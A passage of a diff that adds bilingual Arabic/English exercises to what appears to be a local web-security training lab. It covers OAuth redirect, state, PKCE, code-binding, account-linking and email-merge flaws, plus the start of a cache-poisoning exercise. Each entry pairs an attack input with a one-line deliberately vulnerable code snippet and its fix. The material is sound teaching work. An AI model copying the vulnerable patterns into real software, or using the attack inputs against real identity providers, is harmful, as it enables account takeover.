+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "oauth-redirect",
+    "group": "oauth",
+    "title": {
+      "ar": "وجهة OAuth غير مسجلة",
+      "en": "Unregistered OAuth callback"
+    },
+    "level": "advanced",
+    "normal": {
+      "redirect_uri": "https://academy.test/callback"
+    },
+    "attack": {
+      "redirect_uri": "https://academy.test.untrusted.test/callback"
+    },
+    "cause": {
+      "ar": "تستخدم مقارنة بداية النص لعنوان callback بدلاً من مطابقة الوجهة المسجلة.",
+      "en": "Callback validation uses a string prefix rather than the registered URI."
+    },
+    "fix": {
+      "ar": "طابق redirect_uri كاملاً مع الوجهات المسجلة للعميل.",
+      "en": "Exactly match the callback against the client’s registered URIs."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 401
+    },
+    "lesson": {
+      "story": {
+        "ar": "تطبيق أكاديمية ومزوّد هوية محليان لهما جلسة Alice وأكواد ووجهات مسجلة ثابتة. الحقول تمثل رسائل البروتوكول في نموذج مغلق؛ لا يوجد تسجيل دخول بخدمة خارجية. في هذه الحالة: تستخدم مقارنة بداية النص لعنوان callback بدلاً من مطابقة الوجهة المسجلة.",
+        "en": "A local academy client and identity-provider fixture have Alice’s session, codes and registered callbacks. Fields represent protocol messages in a closed model, not an external login. In this case: Callback validation uses a string prefix rather than the registered URI."
+      },
+      "interpretation": {
+        "ar": "قارن checks_trace مع authorized والملف الخاص أو الحساب المرتبط وعدد الرموز المصدرة. الأثر لا يثبت بمجرد قبول صفحة callback؛ يجب أن يظهر منح صلاحية أو ربط غير مقصود. طابق redirect_uri كاملاً مع الوجهات المسجلة للعميل.",
+        "en": "Compare checks_trace with authorized, private profile, linked subject and issued token count. A callback page alone is insufficient; inspect unauthorized access, linking or duplicate issuance. Exactly match the callback against the client’s registered URIs."
+      },
+      "bad_code": "allowed = uri.startswith(trusted_prefix)",
+      "fixed_code": "allowed = uri in registered_redirect_uris",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "oauth-state",
+    "group": "oauth",
+    "title": {
+      "ar": "قبول callback بلا ربط بالجلسة",
+      "en": "Callback without session binding"
+    },
+    "level": "advanced",
+    "normal": {
+      "state": "state-alice",
+      "subject": "external-alice"
+    },
+    "attack": {
+      "state": "",
+      "subject": "external-bob"
+    },
+    "cause": {
+      "ar": "تقبل الخدمة callback بلا إثبات يربطه بمحاولة تسجيل دخول بدأت من جلسة Alice.",
+      "en": "The callback is accepted without proof of a login initiated by Alice’s session."
+    },
+    "fix": {
+      "ar": "اربط المعاملة بالجلسة بتحقق صحيح من state أو آلية بروتوكول مكافئة ملائمة للتدفق.",
+      "en": "Bind the transaction to the session with valid state or an equivalent flow-appropriate protocol mechanism."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 401
+    },
+    "lesson": {
+      "story": {
+        "ar": "تطبيق أكاديمية ومزوّد هوية محليان لهما جلسة Alice وأكواد ووجهات مسجلة ثابتة. الحقول تمثل رسائل البروتوكول في نموذج مغلق؛ لا يوجد تسجيل دخول بخدمة خارجية. في هذه الحالة: تقبل الخدمة callback بلا إثبات يربطه بمحاولة تسجيل دخول بدأت من جلسة Alice.",
+        "en": "A local academy client and identity-provider fixture have Alice’s session, codes and registered callbacks. Fields represent protocol messages in a closed model, not an external login. In this case: The callback is accepted without proof of a login initiated by Alice’s session."
+      },
+      "interpretation": {
+        "ar": "قارن checks_trace مع authorized والملف الخاص أو الحساب المرتبط وعدد الرموز المصدرة. الأثر لا يثبت بمجرد قبول صفحة callback؛ يجب أن يظهر منح صلاحية أو ربط غير مقصود. اربط المعاملة بالجلسة بتحقق صحيح من state أو آلية بروتوكول مكافئة ملائمة للتدفق.",
+        "en": "Compare checks_trace with authorized, private profile, linked subject and issued token count. A callback page alone is insufficient; inspect unauthorized access, linking or duplicate issuance. Bind the transaction to the session with valid state or an equivalent flow-appropriate protocol mechanism."
+      },
+      "bad_code": "accept_callback_without_session_binding()",
+      "fixed_code": "require_session_bound_login_transaction()",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "oauth-state-binding",
+    "group": "oauth",
+    "title": {
+      "ar": "إعادة state من جلسة أخرى",
+      "en": "State from another session"
+    },
+    "level": "advanced",
+    "normal": {
+      "state": "state-alice",
+      "subject": "external-alice"
+    },
+    "attack": {
+      "state": "state-bob",
+      "subject": "external-bob"
+    },
+    "cause": {
+      "ar": "يكفي وجود state في المخزن حتى لو كان تابعاً لجلسة Bob.",
+      "en": "Any stored state is accepted even if it belongs to Bob."
+    },
+    "fix": {
+      "ar": "تحقق من وجود state وملكيته للجلسة والغرض ثم استهلكه.",
+      "en": "Verify state existence, session ownership and purpose, then consume it."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 401
+    },
+    "lesson": {
+      "story": {
+        "ar": "تطبيق أكاديمية ومزوّد هوية محليان لهما جلسة Alice وأكواد ووجهات مسجلة ثابتة. الحقول تمثل رسائل البروتوكول في نموذج مغلق؛ لا يوجد تسجيل دخول بخدمة خارجية. في هذه الحالة: يكفي وجود state في المخزن حتى لو كان تابعاً لجلسة Bob.",
+        "en": "A local academy client and identity-provider fixture have Alice’s session, codes and registered callbacks. Fields represent protocol messages in a closed model, not an external login. In this case: Any stored state is accepted even if it belongs to Bob."
+      },
+      "interpretation": {
+        "ar": "قارن checks_trace مع authorized والملف الخاص أو الحساب المرتبط وعدد الرموز المصدرة. الأثر لا يثبت بمجرد قبول صفحة callback؛ يجب أن يظهر منح صلاحية أو ربط غير مقصود. تحقق من وجود state وملكيته للجلسة والغرض ثم استهلكه.",
+        "en": "Compare checks_trace with authorized, private profile, linked subject and issued token count. A callback page alone is insufficient; inspect unauthorized access, linking or duplicate issuance. Verify state existence, session ownership and purpose, then consume it."
+      },
+      "bad_code": "require(state in pending)",
+      "fixed_code": "require(pending[state].session_id == session.id)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "oauth-pkce",
+    "group": "oauth",
+    "title": {
+      "ar": "تجاوز إثبات PKCE",
+      "en": "Missing PKCE verification"
+    },
+    "level": "advanced",
+    "normal": {
+      "verifier": "training-verifier-alice"
+    },
+    "attack": {
+      "verifier": "wrong-verifier"
+    },
+    "cause": {
+      "ar": "تُصدر الخدمة رمز وصول دون مقارنة verifier بتحدي الكود.",
+      "en": "The service issues access without comparing the verifier to the code challenge."
+    },
+    "fix": {
+      "ar": "تحقق من BASE64URL(SHA256(verifier)) قبل صرف الكود.",
+      "en": "Check BASE64URL(SHA256(verifier)) before redeeming the code."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 401
+    },
+    "lesson": {
+      "story": {
+        "ar": "تطبيق أكاديمية ومزوّد هوية محليان لهما جلسة Alice وأكواد ووجهات مسجلة ثابتة. الحقول تمثل رسائل البروتوكول في نموذج مغلق؛ لا يوجد تسجيل دخول بخدمة خارجية. في هذه الحالة: تُصدر الخدمة رمز وصول دون مقارنة verifier بتحدي الكود.",
+        "en": "A local academy client and identity-provider fixture have Alice’s session, codes and registered callbacks. Fields represent protocol messages in a closed model, not an external login. In this case: The service issues access without comparing the verifier to the code challenge."
+      },
+      "interpretation": {
+        "ar": "قارن checks_trace مع authorized والملف الخاص أو الحساب المرتبط وعدد الرموز المصدرة. الأثر لا يثبت بمجرد قبول صفحة callback؛ يجب أن يظهر منح صلاحية أو ربط غير مقصود. تحقق من BASE64URL(SHA256(verifier)) قبل صرف الكود.",
+        "en": "Compare checks_trace with authorized, private profile, linked subject and issued token count. A callback page alone is insufficient; inspect unauthorized access, linking or duplicate issuance. Check BASE64URL(SHA256(verifier)) before redeeming the code."
+      },
+      "bad_code": "issue_token(code)",
+      "fixed_code": "require(s256(verifier) == code.challenge)\nissue_token(code)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "oauth-pkce-downgrade",
+    "group": "oauth",
+    "title": {
+      "ar": "إسقاط PKCE عند صرف الكود",
+      "en": "PKCE downgrade at redemption"
+    },
+    "level": "advanced",
+    "normal": {
+      "verifier": "training-verifier-alice",
+      "method": "S256"
+    },
+    "attack": {
+      "verifier": "",
+      "method": ""
+    },
+    "cause": {
+      "ar": "تسمح الخدمة بحذف طريقة PKCE في مرحلة الصرف رغم أن الكود مرتبط بتحدي.",
+      "en": "The redemption step lets the caller remove PKCE even though the code has a challenge."
+    },
+    "fix": {
+      "ar": "استمد وجوب PKCE وطريقته من سجل التفويض الأصلي.",
+      "en": "Derive required PKCE method from the original authorization record."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 401
+    },
+    "lesson": {
+      "story": {
+        "ar": "تطبيق أكاديمية ومزوّد هوية محليان لهما جلسة Alice وأكواد ووجهات مسجلة ثابتة. الحقول تمثل رسائل البروتوكول في نموذج مغلق؛ لا يوجد تسجيل دخول بخدمة خارجية. في هذه الحالة: تسمح الخدمة بحذف طريقة PKCE في مرحلة الصرف رغم أن الكود مرتبط بتحدي.",
+        "en": "A local academy client and identity-provider fixture have Alice’s session, codes and registered callbacks. Fields represent protocol messages in a closed model, not an external login. In this case: The redemption step lets the caller remove PKCE even though the code has a challenge."
+      },
+      "interpretation": {
+        "ar": "قارن checks_trace مع authorized والملف الخاص أو الحساب المرتبط وعدد الرموز المصدرة. الأثر لا يثبت بمجرد قبول صفحة callback؛ يجب أن يظهر منح صلاحية أو ربط غير مقصود. استمد وجوب PKCE وطريقته من سجل التفويض الأصلي.",
+        "en": "Compare checks_trace with authorized, private profile, linked subject and issued token count. A callback page alone is insufficient; inspect unauthorized access, linking or duplicate issuance. Derive required PKCE method from the original authorization record."
+      },
+      "bad_code": "if request.method: verify_pkce()",
+      "fixed_code": "require(code.method == \"S256\")\nverify_pkce(code, verifier)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "oauth-code-client",
+    "group": "oauth",
+    "title": {
+      "ar": "كود صادر لعميل آخر",
+      "en": "Code bound to another client"
+    },
+    "level": "advanced",
+    "normal": {
+      "code": "code-academy",
+      "client_id": "academy"
+    },
+    "attack": {
+      "code": "code-other",
+      "client_id": "academy"
+    },
+    "cause": {
+      "ar": "تتحقق الخدمة من وجود الكود دون مطابقته بالعميل الذي يصرفه.",
+      "en": "The service checks that a code exists but not that it belongs to the redeeming client."
+    },
+    "fix": {
+      "ar": "اربط Authorization Code بمعرف العميل الموثوق.",
+      "en": "Bind each authorization code to its registered client."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 401
+    },
+    "lesson": {
+      "story": {
+        "ar": "تطبيق أكاديمية ومزوّد هوية محليان لهما جلسة Alice وأكواد ووجهات مسجلة ثابتة. الحقول تمثل رسائل البروتوكول في نموذج مغلق؛ لا يوجد تسجيل دخول بخدمة خارجية. في هذه الحالة: تتحقق الخدمة من وجود الكود دون مطابقته بالعميل الذي يصرفه.",
+        "en": "A local academy client and identity-provider fixture have Alice’s session, codes and registered callbacks. Fields represent protocol messages in a closed model, not an external login. In this case: The service checks that a code exists but not that it belongs to the redeeming client."
+      },
+      "interpretation": {
+        "ar": "قارن checks_trace مع authorized والملف الخاص أو الحساب المرتبط وعدد الرموز المصدرة. الأثر لا يثبت بمجرد قبول صفحة callback؛ يجب أن يظهر منح صلاحية أو ربط غير مقصود. اربط Authorization Code بمعرف العميل الموثوق.",
+        "en": "Compare checks_trace with authorized, private profile, linked subject and issued token count. A callback page alone is insufficient; inspect unauthorized access, linking or duplicate issuance. Bind each authorization code to its registered client."
+      },
+      "bad_code": "require(code in codes)",
+      "fixed_code": "require(codes[code].client_id == client.id)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "oauth-code-redirect",
+    "group": "oauth",
+    "title": {
+      "ar": "تغيير وجهة الكود عند صرفه",
+      "en": "Code callback binding mismatch"
+    },
+    "level": "advanced",
+    "normal": {
+      "code": "code-academy",
+      "redirect_uri": "https://academy.test/callback"
+    },
+    "attack": {
+      "code": "code-alt",
+      "redirect_uri": "https://academy.test/callback"
+    },
+    "cause": {
+      "ar": "تقبل الخدمة صرف كود بوجهة تختلف عن وجهة طلب التفويض الأصلي.",
+      "en": "A code is redeemed with a callback different from its original authorization request."
+    },
+    "fix": {
+      "ar": "طابق وجهة الصرف بوجهة الكود الأصلية المسجلة.",
+      "en": "Match the redemption callback to the original code binding."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 401
+    },
+    "lesson": {
+      "story": {
+        "ar": "تطبيق أكاديمية ومزوّد هوية محليان لهما جلسة Alice وأكواد ووجهات مسجلة ثابتة. الحقول تمثل رسائل البروتوكول في نموذج مغلق؛ لا يوجد تسجيل دخول بخدمة خارجية. في هذه الحالة: تقبل الخدمة صرف كود بوجهة تختلف عن وجهة طلب التفويض الأصلي.",
+        "en": "A local academy client and identity-provider fixture have Alice’s session, codes and registered callbacks. Fields represent protocol messages in a closed model, not an external login. In this case: A code is redeemed with a callback different from its original authorization request."
+      },
+      "interpretation": {
+        "ar": "قارن checks_trace مع authorized والملف الخاص أو الحساب المرتبط وعدد الرموز المصدرة. الأثر لا يثبت بمجرد قبول صفحة callback؛ يجب أن يظهر منح صلاحية أو ربط غير مقصود. طابق وجهة الصرف بوجهة الكود الأصلية المسجلة.",
+        "en": "Compare checks_trace with authorized, private profile, linked subject and issued token count. A callback page alone is insufficient; inspect unauthorized access, linking or duplicate issuance. Match the redemption callback to the original code binding."
+      },
+      "bad_code": "exchange(code, submitted_redirect)",
+      "fixed_code": "require(submitted_redirect == code.redirect_uri)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "oauth-code-reuse",
+    "group": "oauth",
+    "title": {
+      "ar": "صرف كود التفويض مرتين",
+      "en": "Authorization-code reuse"
+    },
+    "level": "advanced",
+    "normal": {
+      "flow": "control",
+      "uses": 1
+    },
+    "attack": {
+      "flow": "attack",
+      "uses": 2
+    },
+    "cause": {
+      "ar": "الكود نفسه يصدر أكثر من رمز وصول عند تكرار الصرف.",
+      "en": "Repeated redemption issues multiple access tokens for the same code."
+    },
+    "fix": {
+      "ar": "استهلك الكود مرة واحدة؛ تكرار الصرف يعيد invalid_grant.",
+      "en": "Consume the code once; repeated redemption returns invalid_grant."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 207
+    },
+    "lesson": {
+      "story": {
+        "ar": "تطبيق أكاديمية ومزوّد هوية محليان لهما جلسة Alice وأكواد ووجهات مسجلة ثابتة. الحقول تمثل رسائل البروتوكول في نموذج مغلق؛ لا يوجد تسجيل دخول بخدمة خارجية. في هذه الحالة: الكود نفسه يصدر أكثر من رمز وصول عند تكرار الصرف.",
+        "en": "A local academy client and identity-provider fixture have Alice’s session, codes and registered callbacks. Fields represent protocol messages in a closed model, not an external login. In this case: Repeated redemption issues multiple access tokens for the same code."
+      },
+      "interpretation": {
+        "ar": "قارن checks_trace مع authorized والملف الخاص أو الحساب المرتبط وعدد الرموز المصدرة. الأثر لا يثبت بمجرد قبول صفحة callback؛ يجب أن يظهر منح صلاحية أو ربط غير مقصود. استهلك الكود مرة واحدة؛ تكرار الصرف يعيد invalid_grant.",
+        "en": "Compare checks_trace with authorized, private profile, linked subject and issued token count. A callback page alone is insufficient; inspect unauthorized access, linking or duplicate issuance. Consume the code once; repeated redemption returns invalid_grant."
+      },
+      "bad_code": "for request in requests: issue(code)",
+      "fixed_code": "consume_code_once_atomically(code)\nissue_token(code)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "oauth-link-csrf",
+    "group": "oauth",
+    "title": {
+      "ar": "ربط حساب خارجي دون نية المستخدم",
+      "en": "Account-linking request forgery"
+    },
+    "level": "advanced",
+    "normal": {
+      "state": "link-alice",
+      "subject": "external-alice"
+    },
+    "attack": {
+      "state": "",
+      "subject": "external-bob"
+    },
+    "cause": {
+      "ar": "يرتبط حساب Alice المحلي بحساب خارجي اختاره طرف آخر دون نية ربط موثقة.",
+      "en": "Alice’s local account is linked to another actor’s external account without a verified linking intent."
+    },
+    "fix": {
+      "ar": "اربط طلب ربط الحساب بالجلسة والنية وهوية الحساب الخارجي.",
+      "en": "Bind account linking to session, explicit intent and external account identity."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 401
+    },
+    "lesson": {
+      "story": {
+        "ar": "تطبيق أكاديمية ومزوّد هوية محليان لهما جلسة Alice وأكواد ووجهات مسجلة ثابتة. الحقول تمثل رسائل البروتوكول في نموذج مغلق؛ لا يوجد تسجيل دخول بخدمة خارجية. في هذه الحالة: يرتبط حساب Alice المحلي بحساب خارجي اختاره طرف آخر دون نية ربط موثقة.",
+        "en": "A local academy client and identity-provider fixture have Alice’s session, codes and registered callbacks. Fields represent protocol messages in a closed model, not an external login. In this case: Alice’s local account is linked to another actor’s external account without a verified linking intent."
+      },
+      "interpretation": {
+        "ar": "قارن checks_trace مع authorized والملف الخاص أو الحساب المرتبط وعدد الرموز المصدرة. الأثر لا يثبت بمجرد قبول صفحة callback؛ يجب أن يظهر منح صلاحية أو ربط غير مقصود. اربط طلب ربط الحساب بالجلسة والنية وهوية الحساب الخارجي.",
+        "en": "Compare checks_trace with authorized, private profile, linked subject and issued token count. A callback page alone is insufficient; inspect unauthorized access, linking or duplicate issuance. Bind account linking to session, explicit intent and external account identity."
+      },
+      "bad_code": "link(session.user, callback.subject)",
+      "fixed_code": "require_verified_link_intent(session, callback)\nlink(session.user, callback.subject)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "oauth-unverified-email",
+    "group": "oauth",
+    "title": {
+      "ar": "دمج الحساب ببريد غير موثق",
+      "en": "Account merge using an unverified email"
+    },
+    "level": "advanced",
+    "normal": {
+      "email": "alice@example.test",
+      "email_verified": true
+    },
+    "attack": {
+      "email": "alice@example.test",
+      "email_verified": false
+    },
+    "cause": {
+      "ar": "تدمج الخدمة حساباً خارجياً بحساب Alice لمجرد تطابق نص البريد.",
+      "en": "An external identity is merged into Alice’s account based only on the email string."
+    },
+    "fix": {
+      "ar": "لا تستخدم بريداً غير موثق لإثبات ملكية حساب محلي؛ اطلب إثبات ربط مناسباً.",
+      "en": "Do not use unverified email as proof of local ownership; require appropriate linking proof."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 401
+    },
+    "lesson": {
+      "story": {
+        "ar": "تطبيق أكاديمية ومزوّد هوية محليان لهما جلسة Alice وأكواد ووجهات مسجلة ثابتة. الحقول تمثل رسائل البروتوكول في نموذج مغلق؛ لا يوجد تسجيل دخول بخدمة خارجية. في هذه الحالة: تدمج الخدمة حساباً خارجياً بحساب Alice لمجرد تطابق نص البريد.",
+        "en": "A local academy client and identity-provider fixture have Alice’s session, codes and registered callbacks. Fields represent protocol messages in a closed model, not an external login. In this case: An external identity is merged into Alice’s account based only on the email string."
+      },
+      "interpretation": {
+        "ar": "قارن checks_trace مع authorized والملف الخاص أو الحساب المرتبط وعدد الرموز المصدرة. الأثر لا يثبت بمجرد قبول صفحة callback؛ يجب أن يظهر منح صلاحية أو ربط غير مقصود. لا تستخدم بريداً غير موثق لإثبات ملكية حساب محلي؛ اطلب إثبات ربط مناسباً.",
+        "en": "Compare checks_trace with authorized, private profile, linked subject and issued token count. A callback page alone is insufficient; inspect unauthorized access, linking or duplicate issuance. Do not use unverified email as proof of local ownership; require appropriate linking proof."
+      },
+      "bad_code": "find_local_account(claims.email)",
+      "fixed_code": "require(claims.email_verified)\nrequire_appropriate_linking_proof()",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "cache-forwarded-host",
+    "group": "cache",
+    "title": {
+      "ar": "تسميم عنوان المورد عبر المضيف",
+      "en": "Unkeyed forwarded host"
+    },
+    "level": "advanced",
+    "normal": {
+      "forwarded_host": "academy.test"
+    },
+    "attack": {
+      "forwarded_host": "untrusted.test"
+    },
+    "cause": {
+      "ar": "رأس المضيف الوكيل يؤثر بعنوان المورد بينما مفتاح الكاش لا يفصله.",
+      "en": "A forwarded host changes the asset URL without changing the cache key."
+    },
+    "fix": {
+      "ar": "استخرج المضيف من إعداد موثوق أو تحقق منه قبل بناء الروابط.",
+      "en": "Use a configured trusted host or validate it before generating links."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "طبقة أصل وذاكرة مشتركة تنفذ طلب تهيئة ثم قراءة مستقلة بسياق مستخدم آخر. كل إرسال يبدأ بكاش بارد كي تكون المقارنة قابلة للتكرار. افحص مفتاح التخزين وما وصل للقارئ الثاني. في هذه الحالة: رأس المضيف الوكيل يؤثر بعنوان المورد بينما مفتاح الكاش لا يفصله.",
+        "en": "An origin/cache pipeline performs a prime followed by an independent read in another user context. Each submission starts cold for reproducibility. Inspect cache keys and the second reader’s response. In this case: A forwarded host changes the asset URL without changing the cache key."
+      },
+      "interpretation": {
